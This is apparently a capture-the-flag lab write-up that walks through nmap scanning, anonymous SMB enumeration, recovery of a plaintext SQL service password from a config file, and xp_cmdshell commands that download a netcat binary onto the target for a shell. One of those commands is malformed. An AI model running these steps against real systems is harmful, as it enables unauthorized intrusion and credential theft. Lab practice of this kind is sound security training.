IP Machine 10.129.90.151

# Task 1
Which TCP port is hosting a database server?
`└─$ nmap -sC -sV -vv 10.129.90.151 -oN scan/scan.txt`

# Task 2
What is the name of the non-Administrative share available over SMB
```
smbclient -N -L \\\\<IP Machine>\\
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.90.151 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
-N - no passw
-L - List host
lets enumerate more, in backups there is config file, Lets download to our local machine by using get command
```
smbclient -N \\\\10.129.90.151\\backups 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2625448 blocks available
smb: \> get prod.dtsConfig

```
```
$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>   
```
we can spot a password
Password=M3g4c0rp123
# Task 3

What is the password identified in the file on the SMB share?
M3g4c0rp123

# Task 4

What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
quick google search impacket mssql https://github.com/SecureAuthCorp/impacket

download the script

```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.129.90.151/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell.exe wget http://10.129.90.151nc.exe -OutFile c:\\Users\Public\\nc.exe"/*
```
